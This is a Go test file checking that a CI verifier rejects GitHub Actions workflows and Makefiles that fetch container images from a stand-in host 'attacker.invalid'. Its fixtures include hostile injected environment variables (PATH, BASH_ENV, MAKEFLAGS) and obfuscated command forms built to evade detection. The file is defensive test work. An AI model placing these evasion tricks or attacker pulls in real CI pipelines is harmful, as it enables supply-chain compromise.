package releaseverify

import (
	"path/filepath"
	"strconv"
	"strings"
	"testing"
)

func TestVerifyCIContainerDownloadsRejectsSourceBoundCommandWhoseMakeTargetAcquiresContainers(t *testing.T) {
	root := writeCIContainerDownloadsFixture(t)
	buildPath := filepath.Join(root, "mk", "build.mk")
	writeFixtureFile(t, buildPath, ".PHONY: android\nandroid:\n\tdocker pull attacker.invalid/image:pinned\n")
	makefilePath := filepath.Join(root, "Makefile")
	writeFixtureFile(t, makefilePath, readFixtureFile(t, makefilePath)+"include mk/build.mk\n")
	writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-android.yml"), `name: android
on: push
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - run: make android
`)
	if err := VerifyCIContainerDownloads(root); err == nil {
		t.Fatal("VerifyCIContainerDownloads accepted a source-bound command after its Make target acquired containers")
	}
}

func TestVerifyCIContainerDownloadsRejectsHostileContextOnSourceBoundMakeSteps(t *testing.T) {
	base := `name: android
on: push
env:
  GO_VERSION: "1.27"
  NODE_VERSION: "22"
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - run: make android
`
	mutations := map[string]func(string) string{
		"workflow MAKEFLAGS": func(workflow string) string {
			return strings.Replace(workflow, "  NODE_VERSION: \"22\"\n", "  NODE_VERSION: \"22\"\n  MAKEFLAGS: --makefile=attacker.mk\n", 1)
		},
		"workflow PATH": func(workflow string) string {
			return strings.Replace(workflow, "  NODE_VERSION: \"22\"\n", "  NODE_VERSION: \"22\"\n  PATH: /attacker\n", 1)
		},
		"workflow BASH_ENV": func(workflow string) string {
			return strings.Replace(workflow, "  NODE_VERSION: \"22\"\n", "  NODE_VERSION: \"22\"\n  BASH_ENV: /attacker\n", 1)
		},
		"job ENV": func(workflow string) string {
			return strings.Replace(workflow, "    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    env:\n      ENV: /attacker\n", 1)
		},
		"job GOENV": func(workflow string) string {
			return strings.Replace(workflow, "    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    env:\n      GOENV: /attacker\n", 1)
		},
		"job GOFLAGS": func(workflow string) string {
			return strings.Replace(workflow, "    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    env:\n      GOFLAGS: -run=^$\n", 1)
		},
		"step MAKEFLAGS": func(workflow string) string {
			return strings.Replace(workflow, "      - run: make android\n", "      - env:\n          MAKEFLAGS: -n\n        run: make android\n", 1)
		},
		"step PATH": func(workflow string) string {
			return strings.Replace(workflow, "      - run: make android\n", "      - env:\n          PATH: /attacker\n        run: make android\n", 1)
		},
		"step defaults shell": func(workflow string) string {
			return strings.Replace(workflow, "    steps:\n", "    defaults:\n      run:\n        shell: attacker {0}\n    steps:\n", 1)
		},
		"workflow defaults working directory": func(workflow string) string {
			return strings.Replace(workflow, "jobs:\n", "defaults:\n  run:\n    working-directory: attacker\njobs:\n", 1)
		},
		"step shell": func(workflow string) string {
			return strings.Replace(workflow, "      - run: make android\n", "      - shell: attacker {0}\n        run: make android\n", 1)
		},
		"step working directory": func(workflow string) string {
			return strings.Replace(workflow, "      - run: make android\n", "      - working-directory: attacker\n        run: make android\n", 1)
		},
		"job condition": func(workflow string) string {
			return strings.Replace(workflow, "    runs-on: ubuntu-latest\n", "    if: false\n    runs-on: ubuntu-latest\n", 1)
		},
		"step condition": func(workflow string) string {
			return strings.Replace(workflow, "      - run: make android\n", "      - if: false\n        run: make android\n", 1)
		},
	}
	for name, mutate := range mutations {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			androidPath := filepath.Join(root, "mk", "android.mk")
			writeFixtureFile(t, androidPath, ".PHONY: android\nandroid:\n\t@true\n")
			makefilePath := filepath.Join(root, "Makefile")
			writeFixtureFile(t, makefilePath, readFixtureFile(t, makefilePath)+"include mk/android.mk\n")
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-android.yml"), mutate(base))
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted hostile inherited context on a source-bound Make step")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsConstructedWorkflowExecutables(t *testing.T) {
	commands := map[string]string{
		"adjacent variables":          `LEFT=dock; RIGHT=er; "$LEFT$RIGHT" pull attacker.invalid/image:pinned`,
		"braced adjacent variables":   `LEFT=dock; RIGHT=er; "${LEFT}${RIGHT}" pull attacker.invalid/image:pinned`,
		"separately quoted variables": `LEFT=dock; RIGHT=er; "$LEFT""$RIGHT" pull attacker.invalid/image:pinned`,
		"literal suffix":              `LEFT=dock; "${LEFT}er" pull attacker.invalid/image:pinned`,
	}
	for name, command := range commands {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			workflow := "name: extra\non: push\njobs:\n  acquire:\n    runs-on: ubuntu-latest\n    steps:\n      - run: " + strconv.Quote(command) + "\n"
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), workflow)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted a dynamically constructed executable")
			}
		})
	}
	t.Run("indented literal scalar", func(t *testing.T) {
		root := writeCIContainerDownloadsFixture(t)
		writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), `name: extra
on: push
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - run: |
          do\
          cker pull attacker.invalid/image:pinned
`)
		if err := VerifyCIContainerDownloads(root); err == nil {
			t.Fatal("VerifyCIContainerDownloads accepted an indented shell line-spliced container route")
		}
	})
}

func TestVerifyCIContainerDownloadsRejectsDynamicExecutablesInsideCommandSubstitutions(t *testing.T) {
	commands := map[string]string{
		"parenthesized variable executable":       `echo "$($HELPER attacker.invalid/image:pinned)"`,
		"braced variable executable":              `echo "$(${HELPER} attacker.invalid/image:pinned)"`,
		"nested env variable executable":          `echo "$(env "$HELPER" attacker.invalid/image:pinned)"`,
		"nested command variable executable":      `echo "$(command "${HELPER}" attacker.invalid/image:pinned)"`,
		"nested interpreter variable executable":  `echo "$(bash -c '$HELPER attacker.invalid/image:pinned')"`,
		"nested substitution variable executable": `echo "$(printf '%s' "$($HELPER attacker.invalid/image:pinned)")"`,
	}
	for name, command := range commands {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			workflow := "name: extra\non: push\njobs:\n  run:\n    runs-on: ubuntu-latest\n    steps:\n      - run: " + strconv.Quote(command) + "\n"
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), workflow)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted a dynamic executable inside command substitution")
			}
		})
	}
}
